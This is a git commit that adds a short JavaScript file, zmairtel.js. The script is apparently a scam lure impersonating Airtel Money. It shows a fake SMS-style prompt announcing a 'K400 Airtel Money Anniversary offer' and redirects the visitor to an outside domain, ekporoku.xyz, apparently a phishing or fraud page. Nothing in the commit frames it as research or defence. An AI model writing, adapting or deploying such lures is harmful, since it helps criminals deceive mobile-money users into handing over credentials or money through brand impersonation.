0d17a36d045e38d031f87bdec1da59d0a46c77f3
newetijazz9 <newetijazz9@gmail.com>
2025-11-13 15:42:35 +0100

    Create zmairtel.js

---
+++ zmairtel.js
@@ -0,0 +1,5 @@
+var password = 'K400'
+password=prompt('SMS: Congratulations, your account is eligible to receive K400 Airtel Money Anniversary offer, press OK to Activate','K400');
+if (password != 'K400') {
+location.href='https://www.ekporoku.xyz/k400-AirtelMoney';
+}
